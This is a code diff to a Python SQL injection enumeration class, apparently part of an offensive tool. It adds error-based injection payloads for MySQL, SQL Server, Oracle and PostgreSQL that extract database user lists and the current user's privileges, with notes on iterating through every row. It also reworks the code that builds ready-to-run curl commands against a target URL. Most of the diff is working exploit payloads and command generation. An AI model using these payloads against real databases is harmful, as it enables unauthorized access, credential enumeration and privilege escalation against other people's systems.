@@ -65,6 +65,22 @@ class DatabaseEnumeration:
                 'what_to_look_for': 'Username@host after "~" in error'
             },
             {
+                'title': 'Enumerate All Database Users',
+                'payload': "1' AND extractvalue(1,concat(0x7e,(SELECT DISTINCT user FROM mysql.user LIMIT 1 OFFSET 0)))--",
+                'grep_pattern': '| grep -i "xpath" -A2',
+                'purpose': 'Extract all MySQL users for privilege escalation research',
+                'what_to_look_for': 'Username after "~" in error',
+                'iterate_note': 'Change OFFSET 0 to 1, 2, 3... to enumerate all users'
+            },
+            {
+                'title': 'Extract Current User Privileges',
+                'payload': "1' AND extractvalue(1,concat(0x7e,(SELECT privilege_type FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",user(),\"'\") LIMIT 1 OFFSET 0)))--",
+                'grep_pattern': '| grep -i "xpath" -A2',
+                'purpose': 'Enumerate privileges for current user (FILE, SUPER, etc.)',
+                'what_to_look_for': 'Privilege name after "~" (FILE=read/write files, SUPER=admin)',
+                'iterate_note': 'Change OFFSET to enumerate all privileges'
+            },
+            {
                 'title': 'Enumerate Table Names',
                 'payload': "1' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)))--",
                 'grep_pattern': '| grep -i "xpath" -A2',
@@ -110,6 +126,22 @@ class DatabaseEnumeration:
                 'grep_pattern': '| grep -i "conversion\\|convert" -A2',
                 'purpose': 'Check privilege level (sa is sysadmin)',
                 'what_to_look_for': 'Username in error (sa = full control)'
+            },
+            {
+                'title': 'Enumerate All Database Users',
+                'payload': "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.sql_logins WHERE name NOT IN (SELECT TOP 0 name FROM sys.sql_logins)))--",
+                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
+                'purpose': 'Extract all SQL Server logins for privilege analysis',
+                'what_to_look_for': 'Login name in error',
+                'iterate_note': 'Change TOP 0 to TOP 1, TOP 2, etc. to enumerate all logins'
+            },
+            {
+                'title': 'Extract Current User Privileges',
+                'payload': "1' AND 1=CONVERT(int,(SELECT TOP 1 permission_name FROM fn_my_permissions(NULL, 'SERVER')))--",
+                'grep_pattern': '| grep -i "conversion\\|convert" -A2',
+                'purpose': 'Enumerate server-level permissions for current user',
+                'what_to_look_for': 'Permission name in error (CONTROL SERVER=admin, ALTER ANY LOGIN=create users)',
+                'iterate_note': 'Use TOP 1, TOP 2, etc. to enumerate all permissions'
             },
             {
                 'title': 'Enumerate Table Names',
@@ -159,6 +191,22 @@ class DatabaseEnumeration:
                 'what_to_look_for': 'Username in error'
             },
             {
+                'title': 'Enumerate All Database Users',
+                'payload': "1' AND 1=CAST((SELECT username FROM all_users WHERE ROWNUM=1 AND username NOT IN ('USER1')) AS NUMBER)--",
+                'grep_pattern': '| grep -i "invalid number" -A2',
+                'purpose': 'Extract all Oracle users for privilege enumeration',
+                'what_to_look_for': 'Username in error',
+                'iterate_note': "Add discovered users to NOT IN clause: ('USER1','USER2',...)"
+            },
+            {
+                'title': 'Extract Current User Privileges',
+                'payload': "1' AND 1=CAST((SELECT privilege FROM user_sys_privs WHERE ROWNUM=1 AND privilege NOT IN ('PRIV1')) AS NUMBER)--",
+                'grep_pattern': '| grep -i "invalid number" -A2',
+                'purpose': 'Enumerate system privileges for current user',
+                'what_to_look_for': 'Privilege name in error (DBA, CREATE SESSION, etc.)',
+                'iterate_note': "Add discovered privileges to NOT IN clause: ('PRIV1','PRIV2',...)"
+            },
+            {
                 'title': 'Enumerate Table Names',
                 'payload': "1' AND 1=CAST((SELECT table_name FROM all_tables WHERE ROWNUM=1 AND table_name NOT IN ('TABLE1')) AS NUMBER)--",
                 'grep_pattern': '| grep -i "invalid number" -A2',
@@ -206,6 +254,21 @@ class DatabaseEnumeration:
                 'what_to_look_for': 'Username in error, check if ends with "postgres" (superuser)'
             },
             {
+                'title': 'Enumerate All Database Users',
+                'payload': "1' AND 1=CAST((SELECT usename FROM pg_user LIMIT 1 OFFSET 0) AS int)--",
+                'grep_pattern': '| grep -i "invalid" -A2',
+                'purpose': 'Extract all PostgreSQL users and check for superuser privileges',
+                'what_to_look_for': 'Username in error',
+                'iterate_note': 'Change OFFSET 0 to 1, 2, 3... to enumerate all users'
+            },
+            {
+                'title': 'Extract Current User Privileges',
+                'payload': "1' AND 1=CAST((SELECT CONCAT(usesuper::text,'|',usecreatedb::text,'|',usecatupd::text) FROM pg_user WHERE usename=current_user) AS int)--",
+                'grep_pattern': '| grep -i "invalid" -A2',
+                'purpose': 'Check superuser, createdb, and catalog update privileges',
+                'what_to_look_for': 'Format: superuser|createdb|catupdate (t=true, f=false)'
+            },
+            {
                 'title': 'Enumerate Table Names',
                 'payload': "1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS int)--",
                 'grep_pattern': '| grep -i "invalid" -A2',
@@ -233,15 +296,19 @@ class DatabaseEnumeration:
 
         for step in steps:
             if method == 'POST' and post_params:
-                data_copy = post_params.copy()
-                data_copy[param] = [step['payload']]
-                data_str = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}"
-                                    for k, v in data_copy.items()])
+                # POST request with --data-urlencode
+                data_parts = []
+                for k, v in post_params.items():
+                    val = v[0] if isinstance(v, list) else v
+                    if k == param:
+                        data_parts.append(f"--data-urlencode \"{k}={step['payload']}\"")
+                    else:
+                        data_parts.append(f"--data-urlencode \"{k}={val}\"")
 
-                curl_cmd = f"curl -X POST {target} \\\n  -d \"{data_str}\" \\\n  {step['grep_pattern']}"
+                curl_cmd = f"curl '{target}' \\\n  {' \\\n  '.join(data_parts)} \\\n  {step['grep_pattern']}"
             else:
-                # GET request
-                curl_cmd = f"curl \"{target}?{param}={step['payload']}\" \\\n  {step['grep_pattern']}"
+                # GET request with -G and --data-urlencode
+                curl_cmd = f"curl -G '{target}' \\\n  --data-urlencode \"{param}={step['payload']}\" \\\n  {step['grep_pattern']}"
 
             formatted_steps.append({
                 'title': step['title'],
@@ -258,13 +325,15 @@ class DatabaseEnumeration:
     def get_followup_commands(db_type, param, method, target, post_params=None):
         """Generate database-specific follow-up enumeration commands"""
 
-        if db_type.lower() == 'mysql':
+        db_type_lower = db_type.lower()
+
+        if 'mysql' in db_type_lower or 'mariadb' in db_type_lower:
             return DatabaseEnumeration._mysql_followup(param, method, target, post_params)
-        elif db_type.lower() == 'mssql':
+        elif 'mssql' in db_type_lower or 'microsoft' in db_type_lower or 'sql server' in db_type_lower:
             return DatabaseEnumeration._mssql_followup(param, method, target, post_params)
-        elif db_type.lower() == 'postgresql':
+        elif 'postgresql' in db_type_lower or 'postgres' in db_type_lower:
             return DatabaseEnumeration._postgresql_followup(param, method, target, post_params)
-        elif db_type.lower() == 'oracle':
+        elif 'oracle' in db_type_lower:
             return DatabaseEnumeration._oracle_followup(param, method, target, post_params)
         else:
             # Generic follow-up commands
@@ -621,13 +690,19 @@ class DatabaseEnumeration:
 
             for cmd in commands:
                 if method == 'POST' and post_params:
-                    data_copy = post_params.copy()
-                    data_copy[param] = [cmd['payload']]
-                    data_str = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}"
-                                        for k, v in data_copy.items()])
-                    curl_cmd = f"curl -X POST '{target}' -d \"{data_str}\""
+                    # POST request with --data-urlencode
+                    data_parts = []
+                    for k, v in post_params.items():
+                        val = v[0] if isinstance(v, list) else v
+                        if k == param:
+                            data_parts.append(f"--data-urlencode \"{k}={cmd['payload']}\"")
+                        else:
+                            data_parts.append(f"--data-urlencode \"{k}={val}\"")
+
+                    curl_cmd = f"curl '{target}' \\\n  {' \\\n  '.join(data_parts)}"
                 else:
-                    curl_cmd = f"curl \"{target}?{param}={cmd['payload']}\""
+                    # GET request with -G and --data-urlencode
+                    curl_cmd = f"curl -G '{target}' \\\n  --data-urlencode \"{param}={cmd['payload']}\""
 
                 formatted[category].append({
                     'title': cmd['title'],
